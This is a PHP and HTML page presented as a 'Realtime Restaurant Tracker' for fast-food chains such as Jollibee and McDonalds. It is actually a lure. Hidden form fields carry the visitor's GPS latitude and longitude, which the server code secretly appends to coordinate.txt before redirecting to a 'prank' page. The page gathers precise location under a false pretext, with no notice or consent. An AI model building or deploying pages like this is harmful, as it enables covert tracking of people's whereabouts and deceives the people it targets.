<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Realtime Restaurant Tracker</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
</head>
<body>
    <?php
        if(isset($_POST['restaurants-submit'])){
            $latitude = $_POST['latitude'];
            $longitude = $_POST['longitude'];
            $data = "latitude: $latitude \nlongitude: $longitude \n\n";
            $gps= $_POST['gps'];

            if($gps == "true"){
                $file = fopen("coordinate.txt", "a");
                fwrite($file, $data);
                fclose($file);
                header('Location: prank.html');
            }
        }
    ?>
    <div class="container">
        <form id="restaurants-form" method="post">
            <div id="restaurants-header">
                <h1>Realtime Restaurant Tracker</h1>
                <h3>This allows you to track the realtime number of particular restaurant in your area.</h3>
            </div>
            <div id="restaurants-track">
                <label style="font-size: 1.2em;">Select restaurant:</label>
                <select>
                    <option>Jollibee</option>
                    <option>McDonalds</option>
                    <option>Chowking</option>
                    <option>KFC</option>
                    <option>Mang Inasal</option>
                </select>
                <input type="text" name="latitude" id="set-latitude" style="display: none;">
                <input type="text" name="longitude" id="set-longitude" style="display: none;">
                <input type="text" name="gps" id="gps" style="display: none;" value="false">
            </div>
            <input type="submit" value="Count" id="restaurants-count" name="restaurants-submit">
        </form>
    </div>
</body>
</html>